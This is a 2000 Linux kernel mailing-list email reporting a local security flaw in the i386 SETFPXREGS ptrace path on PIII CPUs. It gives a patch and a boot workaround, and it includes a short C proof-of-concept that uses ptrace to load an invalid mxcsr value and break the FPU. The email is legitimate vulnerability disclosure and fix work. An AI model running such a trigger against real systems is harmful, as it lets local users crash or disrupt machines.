Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S129069AbQKCQlj>; Fri, 3 Nov 2000 11:41:39 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S129094AbQKCQla>; Fri, 3 Nov 2000 11:41:30 -0500
Received: from penguin.e-mind.com ([195.223.140.120]:19304 "EHLO
	penguin.e-mind.com") by vger.kernel.org with ESMTP
	id <S129069AbQKCQlU>; Fri, 3 Nov 2000 11:41:20 -0500
Date: Fri, 3 Nov 2000 17:41:05 +0100
From: Andrea Arcangeli <andrea@suse.de>
To: Linus Torvalds <torvalds@transmeta.com>
Cc: dledford@redhat.com, gareth@valinux.com, linux-kernel@vger.kernel.org
Subject: SETFPXREGS fix
Message-ID: <20001103174105.C857@athlon.random>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
X-GnuPG-Key-URL: http://e-mind.com/~andrea/aa.gnupg.asc
X-PGP-Key-URL: http://e-mind.com/~andrea/aa.asc
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

While auditing the PIII-4 patch for 2.2.x I found a local security problem in
SETFPXREGS that affects 2.4.0-test10 too when it's compiled for PIII
processors and run on a PIII CPU. The problem is that any user can break the
FPU by uploading into the kernel a not valid mxcsr value.

I verified with this proggy:

struct user_fxsr_struct {
	unsigned short	cwd;
	unsigned short	swd;
	unsigned short	twd;
	unsigned short	fop;
	long	fip;
	long	fcs;
	long	foo;
	long	fos;
	long	mxcsr;
	long	reserved;
	long	st_space[32];	/* 8*16 bytes for each FP-reg = 128 bytes */
	long	xmm_space[32];	/* 8*16 bytes for each XMM-reg = 128 bytes */
	long	padding[56];
};

main()
{
	struct user_fxsr_struct fxsr;
	int pid = fork();

	if (pid < 0)
		perror("fork"), exit(1);
	else if (!pid) {
		for (;;)
			__asm__("fninit");
	}

	if (ptrace(0x10, pid, 0, 0) < 0)
		perror("attach"), exit(1);
	memset(&fxsr, 0xff, sizeof(struct user_fxsr_struct));
	waitpid(pid, 0, 0);
	if (ptrace(19, pid, 0, &fxsr))
		perror("setfxsr"), exit(1);
	if (ptrace(0x11, pid, 0, 17) < 0)
		perror("detach"), exit(1);
}

This is the fix against 2.4.0-test10, please include.

--- 2.4.0-test10/arch/i386/kernel/i387.c	Thu Nov  2 20:58:58 2000
+++ PIII/arch/i386/kernel/i387.c	Thu Nov  2 18:44:36 2000
@@ -440,8 +436,25 @@
 int set_fpxregs( struct task_struct *tsk, struct user_fxsr_struct *buf )
 {
 	if ( HAVE_FXSR ) {
-		__copy_from_user( &tsk->thread.i387.fxsave, (void *)buf,
-				  sizeof(struct user_fxsr_struct) );
+		long mxcsr;
+
+		if (__copy_from_user(&tsk->thread.i387.fxsave, (void *)buf,
+				     (long) &((struct user_fxsr_struct *)
+					      0)->mxcsr))
+			return -EFAULT;
+		if (__get_user(mxcsr,
+			       &((struct user_fxsr_struct *) buf)->mxcsr))
+			return -EFAULT;
+		/* bit 6 and 31-16 must be zero for security reasons */
+		mxcsr &= 0xffbf;
+		tsk->thread.i387.fxsave.mxcsr = mxcsr;
+		if (__copy_from_user(&tsk->thread.i387.fxsave.reserved,
+				     &((struct user_fxsr_struct *)
+				       buf)->reserved,
+				     sizeof(struct user_fxsr_struct)-
+				     (long) &((struct user_fxsr_struct *)
+					      0)->reserved))
+			return -EFAULT;
 		return 0;
 	} else {
 		return -EIO;


Downloadable also from here:

	ftp://ftp.us.kernel.org/pub/linux/kernel/people/andrea/patches/v2.4/2.4.0-test10/SETFPXREGS-fix-1

Users of 2.2.18pre17aa1 running their kernel on a PIII cpu are affected as well.
Workaround is to boot with the `nofxsr' parameter (with the downside that
PIII instructions to be inibithed like in vanilla 2.2.x), real fix is to
backout the PIII-4 patch from 2.2.18pre17aa1 and apply this new one:

	ftp://ftp.us.kernel.org/pub/linux/kernel/people/andrea/patches/v2.2/2.2.18pre19/PIII-5.bz2

PIII-5 also merges some worthwhile diff from Doug, thanks!

Andrea
-
To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
the body of a message to majordomo@vger.kernel.org
Please read the FAQ at http://www.tux.org/lkml/
